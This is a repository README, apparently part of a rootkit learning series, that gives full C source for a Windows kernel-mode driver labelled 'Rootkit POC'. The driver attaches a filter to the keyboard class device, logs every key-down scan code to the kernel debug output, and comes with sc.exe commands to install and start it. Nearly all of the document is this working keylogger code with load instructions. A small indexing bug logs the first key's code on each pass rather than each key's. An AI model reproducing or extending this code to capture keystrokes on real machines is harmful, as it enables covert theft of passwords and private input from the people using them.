## Rootkits - Keylogger

---

### Driver

_**DriverKeylogger.c**_ is a Windows kernel-mode driver that serves as a demonstration of a basic rootkit functionality. This driver attaches itself to the keyboard device and then intercepts input events, logs the keystrokes, and optionally performs filtering. It is intended for monitoring purposes, such as security auditing, user activity tracking or the creation of a honeypot environment to attract and analyze malicious activity. However, it is crucial to ensure that its usage complies with legal and ethical guidelines, as unauthorized monitoring of keyboard input may violate privacy rights and regulations.

---

### Source Code

_**DriverKeylogger.c**_
```
// -----------------------------------------------------------
// Name: KMDF5DriverKeyboard
// Visual Studio Project: Template -> Kernel Mode Driver, Empty (KMDF)


// This header is used by kernel
#include <ntddk.h>                                                                      // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/


/**
    @brief      This structure is used as an extension to the device object for keyboard-related operations.

    @field      LowerKbdDevice      Pointer to the lower-level keyboard device object.
**/

typedef struct {
    PDEVICE_OBJECT LowerKbdDevice;
} DEVICE_EXTENSION, * PDEVICE_EXTENSION;                                                // https://doxygen.reactos.org/da/db3/struct____DEVICE__EXTENSION____.html


/**
    @brief      This structure represents information related to keyboard input events.

    @field      UnitId              Specifies the unit number of a keyboard device. A keyboard device name has the format \Device\KeyboardPortN, where the suffix N is the unit number of the device. For example, a device, whose name is \Device\KeyboardPort0, has a unit number of zero, and a device, whose name is \Device\KeyboardPort1, has a unit number of one.
    @field      MakeCode            Specifies the scan code associated with a key press.
    @field      Flags               Specifies a bitwise OR of one or more of the following flags that indicate whether a key was pressed or released, and other miscellaneous information.
    @field      Reserved            Reserved for operating system use.
    @field      ExtraInformation    Specifies device-specific information associated with a keyboard event.
**/

typedef struct _KEYBOARD_INPUT_DATA {
    USHORT UnitId;
    USHORT MakeCode;
    USHORT Flags;
    USHORT Reserved;
    ULONG  ExtraInformation;
} KEYBOARD_INPUT_DATA, * PKEYBOARD_INPUT_DATA;                                          // https://learn.microsoft.com/en-us/windows/win32/api/ntddkbd/ns-ntddkbd-keyboard_input_data


// Device name and symbolic link
UNICODE_STRING G_DEVICE_NAME;
UNICODE_STRING G_DEVICE_SYMBOLIC_LINK;

// Pointer to device object for keyboard driver
PDEVICE_OBJECT myKeyboardDevice = NULL;

// Counter to track the number of pending keyboard input events
ULONG pendingKey = 0;


/**
    @brief      Unloads a Windows kernel-mode driver.

                This function is called when the driver is being unloaded from memory. It is responsible for cleaning up resources and performing necessary cleanup tasks before the driver is removed from the system. For guidelines and implementation details, see the Microsoft documentation at: https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_unload
    
    @param      pDriverObject       Pointer to a DRIVER_OBJECT structure representing the driver.
**/

VOID
DriverUnload(
    _In_    PDRIVER_OBJECT      pDriverObject                                           // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
)
{
    // Set interval to wait for pending key events
    LARGE_INTEGER interval = { 0 };
    interval.QuadPart = -10 * 1000 * 1000;

    PDEVICE_OBJECT DeviceObject = pDriverObject->DeviceObject;

    // Detach keyboard device
    // The IoDetachDevice routine releases an attachment between the caller's device object and a lower driver's device object.
    IoDetachDevice(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->LowerKbdDevice); // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iodetachdevice

    // Wait for pending key events to complete
    while (pendingKey)
    {
        // The KeDelayExecutionThread routine puts the current thread into an alertable or nonalertable wait state for a specified interval.
        KeDelayExecutionThread(KernelMode, FALSE, &interval);                           // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-kedelayexecutionthread
    }

    // Delete device object
    // The IoDeleteDevice routine removes a device object from the system, for example, when the underlying device is removed from the system.
    IoDeleteDevice(myKeyboardDevice);                                                  // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iodeletedevice

    // Print a debug message to indicate the driver has been unloaded
    DbgPrint("Rootkit POC: Unloading... Service has stopped");                          // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-dbgprint
}


/**
    @brief      A passthrough function for handling IRPs (I/O Request Packets).

    @param      pDeviceObject       Pointer to a DEVICE_OBJECT structure representing the device.
    @param      pIrp                Pointer to an IRP (I/O Request Packet) to be processed.

    @return     A NTSTATUS value indicating success or an error code if operation fails.
**/

NTSTATUS
DriverPassthrough(
    _In_    PDEVICE_OBJECT      pDeviceObject,                                          // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
    _In_    PIRP                pIrp                                                    // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
)
{
    // Copy current IRP stack location to next stack location
    // The IoCopyCurrentIrpStackLocationToNext routine copies the IRP stack parameters from the current I/O stack location to the stack location of the next-lower driver.
    IoCopyCurrentIrpStackLocationToNext(pIrp);                                          // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocopycurrentirpstacklocationtonext

    // Forward IRP to lower-level keyboard device driver
    // The IoCallDriver routine, wraps IofCallDriver that sends an IRP to the driver associated with a specified device object.
    return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->LowerKbdDevice, pIrp); // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocalldriver
}


/**
    @brief      Callback function invoked upon completion of a read operation.

    @param      pDeviceObject       Pointer to a DEVICE_OBJECT structure representing the device.
    @param      pIrp                Pointer to an IRP (I/O request packet) for the read operation.
    @param      context             User-defined context parameter.

    @return     A NTSTATUS value indicating success or an error code if operation fails.
**/

NTSTATUS
ReadOperationFinished(
    _In_    PDEVICE_OBJECT      pDeviceObject,                                          // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
    _In_    PIRP                pIrp,                                                   // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
    _In_    PVOID               context
)
{
    // Preventing compiler warnings for unused parameters
    UNREFERENCED_PARAMETER(pDeviceObject);
    UNREFERENCED_PARAMETER(context);

    // Flags
    /*
    CHAR* keyflag[4] = {
        "KeyDown",  //  0      KEY_MAKE        The key was pressed.
        "KeyUp",    //  1      KEY_BREAK       The key was released. 
        "E0",       //  2      KEY_E0          Extended scan code used to indicate special keyboard functions. 
        "E1"        //  3      KEY_E1          Extended scan code used to indicate special keyboard functions. 
    };
    */

    // Pointer to the buffer containing keyboard input data
    PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer; // https://learn.microsoft.com/en-us/windows/win32/api/ntddkbd/ns-ntddkbd-keyboard_input_data

    // Calculate the number of keyboard input data structures in the buffer
    ULONG_PTR structnum = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

    // Check if read operation was successful
    if (pIrp->IoStatus.Status == STATUS_SUCCESS)
    {
        // Iterate through keyboard input data
        for (int i = 0; i < structnum; i++)
        {
            // KeyDown event
            if (keys[i].Flags ==0)
            {
                // Keyboard scan code
                DbgPrint("Rootkit POC: Keylogger says %x\n", keys->MakeCode);           // https://kbdlayout.info/kbdusx/scancodes
            }
        }
    }

    // Mark IRP as pending if it was pending
    if (pIrp->PendingReturned) {
        // The IoMarkIrpPending routine marks the specified IRP, indicating that a driver's dispatch routine subsequently returned STATUS_PENDING because further processing is required by other driver routines.
        IoMarkIrpPending(pIrp);
    }

    // Decrement the pendingKey count
    pendingKey--;

    // Return the status of the read operation
    return pIrp->IoStatus.Status;
}


/**
    @brief      Function to read keystrokes from keyboard device.

    @param      pDeviceObject       Pointer to a DEVICE_OBJECT structure representing the device.
    @param      pIrp                Pointer to the I/O request packet (IRP) for reading keystrokes.

    @return     A NTSTATUS value indicating success or an error code if operation fails.
**/

NTSTATUS
DriverReadKeystrokes(
    _In_    PDEVICE_OBJECT      pDeviceObject,                                          // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
    _In_    PIRP                pIrp                                                    // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
)
{
    // Copy current IRP stack location to next stack location
    // The IoCopyCurrentIrpStackLocationToNext routine copies the IRP stack parameters from the current I/O stack location to the stack location of the next-lower driver.
    IoCopyCurrentIrpStackLocationToNext(pIrp);                                          // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocopycurrentirpstacklocationtonext

    // Set completion routine for IRP
    // The IoSetCompletionRoutine routine registers an IoCompletion routine, which will be called when the next-lower-level driver has completed the requested operation for the given IRP.
    IoSetCompletionRoutine(pIrp, ReadOperationFinished, NULL, TRUE, TRUE, TRUE);        // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iosetcompletionroutine

    // Increment pendingKey count to track pending read operations
    pendingKey++;

    // Forward IRP to lower-level keyboard device driver
    // The IoCallDriver routine, wraps IofCallDriver that sends an IRP to the driver associated with a specified device object.
    return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->LowerKbdDevice, pIrp); // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocalldriver
}


/**
    @brief      Attaches the keyboard device to the driver.

    @param      pDriverObject       Pointer to a DRIVER_OBJECT structure representing the driver's image in the operating system kernel.

    @return     A NTSTATUS value indicating success or an error code if operation fails.
**/

NTSTATUS
DriverAttachKeyboard(
    _In_    PDRIVER_OBJECT      pDriverObject                                           // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
)
{
    // Variables
    NTSTATUS Status;
    UNICODE_STRING TargetDevice = RTL_CONSTANT_STRING(L"\\Device\\KeyboardClass0");     // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlinitunicodestring

    // Create a device object for the keyboard
    // The IoCreateDevice routine creates a device object for use by a driver.
    Status = IoCreateDevice(pDriverObject, sizeof(DEVICE_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, 0, FALSE, &myKeyboardDevice); // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice
    if (!NT_SUCCESS(Status))
    {
        DbgPrint("Rootkit POC Failed: Error creating device for keyboard -> Status: 0x%08X\n", Status);
        return Status;
    }

    // Set DO_BUFFERED_IO flag
    // After attaching a legacy filter device object to a file system or volume, always set or clear the DO_BUFFERED_IO and DO_DIRECT_IO flags as needed so that they match the values of the next-lower device object on the driver stack. For more information about these flags, see Methods for Accessing Data Buffers (https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/methods-for-accessing-data-buffers).
    myKeyboardDevice->Flags |= DO_BUFFERED_IO;                                          // https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/propagating-the-do-buffered-io-and-do-direct-io-flags
    
    // Clear DO_DEVICE_INITIALIZING
    // After attaching a legacy filter device object to a file system or volume, always be sure to clear the DO_DEVICE_INITIALIZING flag on the filter device object. (For more information about this flag, see DEVICE_OBJECT in the Kernel Reference https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object). When the filter device object is created, IoCreateDevice sets the DO_DEVICE_INITIALIZING flag on the device object. After the filter is successfully attached, this flag must be cleared. If this flag isn't cleared, no more filter drivers can attach to the filter chain because the call to IoAttachDeviceToDeviceStackSafe will fail. It isn't necessary to clear the DO_DEVICE_INITIALIZING flag on device objects that are created in DriverEntry, because the I/O Manager automatically clears it. However, your driver should clear this flag on all other device objects that it creates.
    myKeyboardDevice->Flags &= ~DO_DEVICE_INITIALIZING;                                 // https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/clearing-the-do-device-initializing-flag

    // Clear device extension
    // The RtlZeroMemory routine fills a block of memory with zeros, given a pointer to the block and the length, in bytes, to be filled.
    RtlZeroMemory(myKeyboardDevice->DeviceExtension, sizeof(DEVICE_EXTENSION));         // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlzeromemory

    // Attach keyboard device to driver
    // The IoAttachDevice routine attaches the caller's device object to a named target device object, so that I/O requests bound for the target device are routed first to the caller.
    Status = IoAttachDevice(myKeyboardDevice, &TargetDevice, &((PDEVICE_EXTENSION)myKeyboardDevice->DeviceExtension)->LowerKbdDevice); // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-ioattachdevice
    if (!NT_SUCCESS(Status))
    {
        // Cleanup and delete device object if attachment fails
        // The IoDeleteDevice routine removes a device object from the system, for example, when the underlying device is removed from the system.
        IoDeleteDevice(myKeyboardDevice);                                               // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iodeletedevice
        return Status;
    }

    // Operation was completed successfully
    return STATUS_SUCCESS;
}


/**
    @brief      Entry point for a Windows kernel-mode driver.
    
                This function is called when the driver is loaded into memory. It initializes the driver and performs necessary setup tasks. For guidelines and implementation details, see the Microsoft documentation at: https://learn.microsoft.com/en-us/windows-hardware/drivers/wdf/driverentry-for-kmdf-drivers
    
    @param      pDriverObject       Pointer to a DRIVER_OBJECT structure representing the driver's image in the operating system kernel.
    @param      pRegistryPath       Pointer to a UNICODE_STRING structure, containing the driver's registry path as a Unicode string, indicating the driver's location in the Windows registry.

    @return     A NTSTATUS value indicating success or an error code if initialization fails.
**/

NTSTATUS
DriverEntry(
    _In_    PDRIVER_OBJECT      pDriverObject,                                          // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
    _In_    PUNICODE_STRING     pRegistryPath                                           // https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string
)
{
    // Preventing compiler warnings for unused parameter
    UNREFERENCED_PARAMETER(pRegistryPath);

    // Variables
    NTSTATUS Status;

    // Initialize device name and symbolic link
    RtlInitUnicodeString(&G_DEVICE_NAME, L"\\Device\\MyKernelDriver");                  // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlinitunicodestring
    RtlInitUnicodeString(&G_DEVICE_SYMBOLIC_LINK, L"\\DosDevices\\MyKernelDriver");

    // Set DriverUnload routine
    pDriverObject->DriverUnload = DriverUnload;                                         // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_unload

    // Set MajorFunction for different IRP types
    // Each driver-specific I/O stack location (IO_STACK_LOCATION) for every IRP contains a major function code (IRP_MJ_XXX), which tells the driver what operation it or the underlying device driver should carry out to satisfy the I/O request. Each kernel-mode driver must provide dispatch routines for the major function codes that it must support (https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-major-function-codes).
    for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
    {
        pDriverObject->MajorFunction[i] = DriverPassthrough;
    }

    // Read Keystrokes
    pDriverObject->MajorFunction[IRP_MJ_READ] = DriverReadKeystrokes;                   //https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-read

    // Create a device object
    // The IoCreateDevice routine creates a device object for use by a driver.
    Status = IoCreateDevice(pDriverObject, 0, &G_DEVICE_NAME, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pDriverObject->DeviceObject); // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice
    if (!NT_SUCCESS(Status))
    {
        DbgPrint("Rootkit POC Failed: Error creating device -> Status: 0x%08X\n", Status);
        return Status;
    }

    // Create a symbolic link for the device
    // The IoCreateSymbolicLink routine sets up a symbolic link between a device object name and a user-visible name for the device.
    Status = IoCreateSymbolicLink(&G_DEVICE_SYMBOLIC_LINK, &G_DEVICE_NAME);             // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatesymboliclink
    if (!NT_SUCCESS(Status))
    {
        DbgPrint("Rootkit POC Failed: Error creating symbolic link -> Status: 0x%08X\n", Status);
        return Status;
    }

    // Attach keyboard
    Status = DriverAttachKeyboard(pDriverObject);
    if (!NT_SUCCESS(Status))
    {
        DbgPrint("Rootkit POC Failed: Error attaching keyboard -> Status: 0x%08X\n", Status);
        return Status;
    }
    
    // Print a debug message to indicate the driver has been loaded
    DbgPrint("Rootkit POC: Loading... Hello World");                                    // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-dbgprint

    // Print a debug message to indicate the keyboard was attached successfully
    DbgPrint("Rootkit POC: Keyboard was attached successfully\n");

    // Driver initialization was completed successfully
    return STATUS_SUCCESS;
}


// -----------------------------------------------------------
```

---

### Test

1. Build the Solutions:
    - Build -> Build Solution

2. Open DebugView as an Administrator:
    - Enable options ("Capture -> Capture Kernel" and "Capture -> Enable Verbose Kernel Output")

3. Open PowerShell as an Administrator and run the following commands to install the driver:
    - .\sc.exe stop KMDF5DriverKeylogger
    - .\sc.exe delete KMDF5DriverKeylogger
    - .\sc.exe create KMDF5DriverKeylogger type=kernel start=demand binpath="C:\Users\user1\Source\Repos\KMDF5DriverKeylogger\x64\Debug\KMDF5DriverKeylogger.sys"
    - .\sc.exe start KMDF5DriverKeylogger

4. Observe Messages in DebugView :
    - Monitor the output in DebugView for any driver messages.

---

### Files

```
├───KMDF5DriverKeylogger
    │   README.md
    │
    ├───Driver
    │       DriverKeylogger.c
    │
    └───x64
            DriverKeylogger.sys
```
